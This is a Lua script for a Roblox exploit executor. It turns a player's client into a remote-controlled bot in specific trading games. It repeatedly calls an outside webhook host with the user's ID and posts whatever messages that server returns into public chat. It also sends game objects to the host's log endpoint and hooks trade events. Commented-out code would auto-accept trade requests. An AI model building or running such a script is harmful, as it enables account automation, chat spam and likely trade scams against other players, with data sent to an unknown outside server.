local HttpService = game:GetService("HttpService")
local Storage = game:GetService("ReplicatedStorage");
local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer

local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))

local headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    ["Content-Type"] = "application/json",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

-- HELPERS

local function submitLog(content) 
    local logUrl = Webhook.."/log"

    local response =
        request({
            Url = logUrl,
            Method = "POST",
            Headers = headers,
            Body = HttpService:JSONEncode(content)
        })
end

local function sendMessage(message)
    local channel = TextChatService.TextChannels.RBXGeneral

    local success, errorMessage = pcall(function()
        channel:SendAsync(message)
    end)
end

local function getTradeStatus()
    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
end

-- PING

while game.PlaceId == 142823291 or game.PlaceId == 335132309 or game.PlaceId == 636649648 do
    local userId = plr.UserId
    local pingUrl = Webhook.."/ping".."?user="..userId

    local response =
        request({
            Url = pingUrl,
            Method = "GET",
            Headers = headers
        })

    local data = HttpService:JSONDecode(response.Body)
    if data.message then 
        sendMessage(data.message)
    end

    wait(60)
end

-- HANDLE TRADE

--[[local function handleTrade()
    print("handling request")
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()

    print(game:GetService("ReplicatedStorage").Trade)
end]]

--[[while true do
    local status = getTradeStatus()

    if status == "ReceivingRequest" then
        wait(0.5)
        handleTrade()
    end

    wait(5)
end]]

-- LISTEN FOR EVENTS

for _, event in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
    print("Event:", event.Name)
    print(HttpService:JSONEncode(event))
    
    submitLog(event)

    if event:IsA("RemoteEvent") then
        event.OnClientEvent:Connect(function(data)
            print("Event:", event.Name, "Data:", tostring(data))
            -- Display data content as string
            if event.Name == "UpdateTrade" then
                local content = {
                    ["UpdateTrade"] = data
                }

                print(HttpService:JSONEncode(content))
            end
        end)
    end
end